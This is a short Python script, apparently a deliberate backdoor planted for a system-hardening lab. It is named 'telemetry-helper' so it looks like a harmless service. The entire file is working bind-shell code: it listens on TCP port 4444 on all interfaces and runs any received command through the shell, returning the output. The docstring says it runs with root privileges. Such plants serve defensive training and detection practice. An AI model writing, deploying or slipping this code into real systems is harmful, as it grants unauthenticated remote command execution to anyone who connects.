#!/usr/bin/env python3
"""telemetry-helper — a NAIVE bind-shell backdoor (lab plant).

                    !!!  DELIBERATELY MALICIOUS LAB PLANT  !!!

The clumsy cousin of knockd-helper: it just binds a root command shell on a TCP
port and sits there. Unlike the covert raw-socket one, this DOES show up in
`ss -lntup` (:4444) — the kind of thing a basic port review catches. Named
"telemetry-helper" and launched by the application-data startup hook. Inert otherwise, confined
to the disposable VM, removed by harden/04-persistence / 05-services.
"""
import socket
import subprocess
import threading

PORT = 4444


def handle(conn):
    conn.sendall(b"# ")
    while True:
        try:
            data = conn.recv(4096)
        except OSError:
            break
        if not data:
            break
        cmd = data.decode("utf-8", "replace").strip()
        if cmd in ("exit", "quit"):
            break
        out = subprocess.run(cmd, shell=True, capture_output=True, timeout=15)
        conn.sendall(out.stdout + out.stderr + b"# ")
    conn.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(5)
    while True:
        conn, _ = srv.accept()
        threading.Thread(target=handle, args=(conn,), daemon=True).start()


if __name__ == "__main__":
    main()
